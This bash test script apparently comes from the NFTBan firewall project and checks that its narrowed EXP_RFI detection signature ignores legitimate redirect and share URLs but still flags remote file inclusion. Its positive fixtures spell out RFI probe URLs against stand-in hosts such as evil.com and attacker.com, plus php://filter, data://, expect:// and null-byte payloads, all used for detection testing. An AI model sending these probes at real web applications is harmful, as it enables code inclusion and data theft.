#!/usr/bin/env bash
# =============================================================================
# NFTBan - Tests for v1.218.13 EXP_RFI false-positive narrowing
# =============================================================================
# SPDX-License-Identifier: MPL-2.0
# meta:name="botscan_exp_rfi_fp_v218_13_test"
# meta:type="test"
# meta:version="1.0.0"
# meta:owner="Antonios Voulvoulis <contact@nftban.com>"
# meta:created_date="2026-07-09"
# meta:description="Verifies the v1.218.13 fix to the EXP_RFI botscan signature. The old pattern was the bare '=https?://' (url-any), which matched ANY request whose query carried a URL-valued parameter — legitimate OAuth redirect_uri, return_url, next, share url=, utm_source, and CDN image-proxy params — so it banned real visitors mid-flow at threshold 2/60s (same RevSlider-class defect as EXP_REVSLIDER). The narrowed pattern matches only real RFI shapes: PHP/stream wrappers (php://, data://, expect://, zip://, phar://, glob://, input://), remote raw-payload-file inclusion (=http(s)/ftp://...(.txt|.log|.dat|.bin|.phtml)), or null-byte truncation (%00). Asserts: the record still parses via the anchored (|-bearing pattern) parse into >=8 fields with match_type/threshold/window/ban/enabled intact (url-any/2/60/7200/true); the pattern is no longer the bare '=https?://'; 8 legit URL-valued-param URLs do NOT match (and the OLD pattern DID match them, proving the fix); 8 real RFI probe URLs DO match; threshold/window/ban/enabled unchanged."
# meta:input="None (reads the shipped exploit.patterns)"
# meta:output="Pass/fail assertions on stdout; exit 0 on all-pass"
# meta:depends="bash,grep"
# meta:inventory.files="etc/nftban/patterns.d/botscan/exploit.patterns"
# meta:inventory.binaries="bash,grep"
# meta:inventory.env_vars=""
# meta:inventory.config_files=""
# meta:inventory.systemd_units=""
# meta:inventory.network=""
# meta:inventory.privileges="none"
# =============================================================================

set -Eeuo pipefail
IFS=$'\n\t'

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
REPO_ROOT=$(cd "$SCRIPT_DIR/../../../.." && pwd)
PATTERNS="$REPO_ROOT/etc/nftban/patterns.d/botscan/exploit.patterns"

# The bare pattern this hotfix replaces (used to prove the negative fixtures were false-banned before).
OLD_PATTERN='=https?://'

PASS=0; FAIL=0; FAILED=()
ok(){ printf "  [PASS] %s\n" "$1"; PASS=$((PASS+1)); }
no(){ printf "  [FAIL] %s\n" "$1"; FAIL=$((FAIL+1)); FAILED+=("$1"); }

echo "=== v1.218.13 EXP_RFI false-positive narrowing ==="

# Grab the EXP_RFI record line.
line=$(grep -E '^EXP_RFI\|' "$PATTERNS" | head -1)
[[ -n "$line" ]] && ok "EXP_RFI record present" || no "EXP_RFI record present"

# Anchored parse (mirrors nftban_botscan.sh: peel NAME off front, 6 fields off back;
# the middle is the legally |-bearing pattern).
name="${line%%|*}"; rest="${line#*|}"
rest="${rest%|*}"                          # drop description (last field; unused here)
enabled="${rest##*|}";   rest="${rest%|*}"
ban="${rest##*|}";       rest="${rest%|*}"
window="${rest##*|}";    rest="${rest%|*}"
threshold="${rest##*|}"; rest="${rest%|*}"
match_type="${rest##*|}";rest="${rest%|*}"
pattern="$rest"

# >= 7 pipes (8 fields; a |-alternation pattern only adds more).
pipes="${line//[!|]/}"
[[ "${#pipes}" -ge 7 ]] && ok "record has >= 7 pipes (parseable into 8 fields)" || no "record has >= 7 pipes"

[[ "$name" == "EXP_RFI" ]] && ok "name field = EXP_RFI" || no "name field ($name)"
[[ "$match_type" == "url-any" ]] && ok "match_type field intact = url-any" || no "match_type ($match_type)"
[[ "$threshold" == "2" ]] && ok "threshold unchanged = 2" || no "threshold ($threshold)"
[[ "$window" == "60" ]] && ok "window unchanged = 60" || no "window ($window)"
[[ "$ban" == "7200" ]] && ok "ban unchanged = 7200" || no "ban ($ban)"
[[ "$enabled" == "true" ]] && ok "enabled unchanged = true" || no "enabled ($enabled)"

# The regression guard: pattern must NOT be the bare '=https?://' token.
[[ "$pattern" != "$OLD_PATTERN" ]] && ok "pattern narrowed (no longer bare '=https?://')" || no "pattern still bare '=https?://' — FALSE-POSITIVE REGRESSION"

# Behavioural: legit URL-valued-param requests must NOT match the new pattern,
# and MUST have matched the OLD bare pattern (proves the fix closes a real FP).
neg_ok=true; old_caught=true
for u in \
  '/oauth/callback?redirect_uri=https://app.example.com/dashboard' \
  '/login?return_url=https://example.com/account' \
  '/go?next=https://example.com/page' \
  '/share?url=https://example.com/article' \
  '/auth?redirect_uri=https://sso.example.com/cb&state=abc' \
  '/?utm_source=https://partner.example.com' \
  '/embed?src=https://cdn.example.com/logo.png' \
  '/img?u=https://cdn.example.com/photo.jpg' ; do
  if printf '%s' "$u" | grep -qE "$pattern"; then neg_ok=false; echo "        matched (bad): $u"; fi
  if ! printf '%s' "$u" | grep -qE "$OLD_PATTERN"; then old_caught=false; fi
done
$neg_ok && ok "legit URL-valued-param requests do NOT match (visitors not banned)" || no "legit request matched — FALSE POSITIVE"
$old_caught && ok "OLD bare pattern DID match all negatives (fix closes a real live FP)" || no "OLD pattern did not match negatives — fixture invalid"

# Behavioural: real RFI probes must still match.
pos_ok=true
for u in \
  '/index.php?page=http://evil.com/shell.txt' \
  '/?file=https://evil.com/c99.txt?' \
  '/include.php?path=http://attacker.com/backdoor.txt' \
  '/?load=php://filter/convert.base64-encode/resource=index' \
  '/?page=data://text/plain;base64,PD9waHA' \
  '/view?tpl=http://evil.com/shell.txt%00' \
  '/?page=expect://id' \
  '/?f=ftp://evil.com/payload.log' ; do
  if ! printf '%s' "$u" | grep -qE "$pattern"; then pos_ok=false; echo "        missed (bad): $u"; fi
done
$pos_ok && ok "real RFI probes still match (detection preserved)" || no "RFI probe missed — detection regression"

echo
echo "=== RESULTS: $PASS passed, $FAIL failed ==="
if [[ $FAIL -gt 0 ]]; then printf 'FAILED: %s\n' "${FAILED[@]}"; exit 1; fi
exit 0
